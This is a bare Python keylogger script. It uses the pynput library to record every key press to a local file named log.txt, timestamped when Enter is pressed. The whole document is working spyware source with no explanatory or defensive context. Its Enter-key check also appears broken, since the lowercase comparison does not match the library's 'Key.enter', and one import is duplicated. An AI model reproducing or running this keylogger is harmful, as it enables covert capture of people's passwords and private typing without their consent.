from pynput.keyboard import Listener
from time import ctime
from time import ctime
def wtf(key):
	ctr=0	
	a=ctime()
	a=str(a)
	a+='\n'
	keydata=str(key)
	keydata=keydata.replace("'","")
	if keydata=='key.enter':
		keydata="\n"
		ctr=1
				
	else:
		pass
	if ctr==1:
		with open("log.txt",'a') as f:
			f.write(keydata)
			f.write(a)
	else:
		with open("log.txt",'a') as f:
			f.write(keydata)
	ctr=0
with Listener(on_press=wtf) as l:
		l.join()